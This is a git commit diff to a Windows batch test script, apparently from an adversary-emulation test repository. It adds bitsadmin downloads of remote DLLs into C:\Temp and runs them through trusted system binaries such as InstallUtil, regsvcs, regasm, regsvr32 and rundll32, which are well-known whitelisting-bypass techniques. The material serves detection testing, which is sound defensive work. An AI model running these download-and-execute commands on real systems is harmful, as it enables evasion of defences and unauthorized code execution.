d26691561236cdb34c7c0c15e0e447a32359820a
caseysmithrc <30840394+caseysmithrc@users.noreply.github.com>
2017-12-20 15:39:07 -0700

    Update All The Things

--- Windows/Payloads/AllTheThings/test.bat
+++ Windows/Payloads/AllTheThings/test.bat
@@ -1,4 +1,10 @@
-
+REM Download DLLs
+if not exist "C:\Temp\" mkdir C:\Temp
+cd C:\Temp
+bitsadmin.exe /transfer "ATT" https://github.com/redcanaryco/atomic-red-team/raw/master/Windows/Payloads/AllTheThings/AllTheThingsx64.dll C:\Temp\AllTheThingsx64.dll
+timeout /t 1 /nobreak > NUL
+bitsadmin.exe /transfer "ATT" https://github.com/redcanaryco/atomic-red-team/raw/master/Windows/Payloads/AllTheThings/AllTheThingsx86.dll C:\Temp\AllTheThingsx86.dll
+timeout /t 1 /nobreak > NUL
 REM X86
 Executing X86 AllTheThings Test
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThingsx86.dll
@@ -7,17 +13,12 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThingsx86.dll
 regsvr32.exe /s /u AllTheThingsx86.dll
 regsvr32.exe /s AllTheThingsx86.dll
 rundll32 AllTheThingsx86.dll,EntryPoint
-odbcconf.exe  /s /a { REGSVR AllTheThingsx86.dll }
-regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThingsx86.dll
-
-
 REM AMD64
-
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThingsx64.dll
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThingsx64.dll
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThingsx64.dll
 regsvr32.exe /s /u AllTheThingsx64.dll
 regsvr32.exe /s AllTheThingsx64.dll
 rundll32 AllTheThingsx64.dll,EntryPoint
-odbcconf.exe  /s /a { REGSVR AllTheThingsx64.dll }
-regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThingsx64.dll
+REM Cleanup
+del C:\Temp\AllTheThings*
